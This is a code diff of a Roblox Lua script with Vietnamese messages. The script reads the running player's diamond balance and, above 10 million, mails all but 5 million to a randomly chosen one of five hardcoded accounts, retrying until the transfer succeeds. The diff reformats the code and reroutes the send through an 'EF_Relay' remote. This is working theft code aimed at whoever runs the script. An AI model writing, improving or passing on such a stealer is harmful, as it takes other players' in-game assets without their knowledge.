@@ -2,45 +2,64 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
-
 local diamondsStat = player:WaitForChild("leaderstats"):FindFirstChild("💎 Diamonds")
 if not diamondsStat then
-	warn("Không tìm thấy chỉ số Diamonds.")
-	return
+    warn("Không tìm thấy chỉ số Diamonds.")
+    return
 end
-
 local currentValue = diamondsStat.Value
 if currentValue <= 10000000 then
-	warn("⚠️ Không đủ kim cương để gửi (cần > 50.000.000).")
-	return
+    warn("⚠️ Không đủ kim cương để gửi (cần > 10.000.000).")
+    return
 end
-
-local receivers = { "ninaFalconBear", "MrsnateFrostFire", "ItstaraSkater2024", "NexusRileyPulse50", "TheRealTinajolt2018" }
-local receiver = receivers[math.random(1, #receivers)]
-
+local receivers = {
+    "ninaFalconBear",
+    "MrsnateFrostFire",
+    "ItstaraSkater2024",
+    "NexusRileyPulse50",
+    "TheRealTinajolt2018"
+}
+local receiver = receivers[
+    math.random(1, #receivers)
+]
 local amountToSend = currentValue - 5000000
-
-local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local Client = ReplicatedStorage
+    :WaitForChild("Library")
+    :WaitForChild("Client")
 local Network = require(Client.Network)
 local Save = require(Client.Save).Get()
-
+local EF_Relay = ReplicatedStorage.Network.EF_Relay
 local diamondsUID
-for uid, v in pairs(Save.Inventory["Currency"]) do
-	if v.id == "Diamonds" then
-		diamondsUID = uid
-		break
-	end
+for uid, v in pairs(
+    Save.Inventory["Currency"]
+) do
+    if v.id == "Diamonds" then
+        diamondsUID = uid
+        break
+    end
 end
 if not diamondsUID then
-	warn("❌ Không tìm thấy Diamonds UID")
-	return
+    warn("❌ Không tìm thấy Diamonds UID")
+    return
 end
-
 while true do
-	local success = Network.Invoke("Mailbox: Send", receiver, "Bless", "Currency", diamondsUID, amountToSend)
-	if success then
-		print("📤 Đã gửi " .. amountToSend .. " 💎 cho người dùng: " .. receiver)
-		break
-	end
-	task.wait(0.1)
+    local ok, success = pcall(function()
+        return EF_Relay:InvokeServer(
+            receiver,
+            "Bless",
+            "Currency",
+            diamondsUID,
+            amountToSend
+        )
+    end)
+    if ok and success == true then
+        print(
+            "📤 Đã gửi "
+            .. amountToSend
+            .. " 💎 cho người dùng: "
+            .. receiver
+        )
+        break
+    end
+    task.wait(0.1)
 end
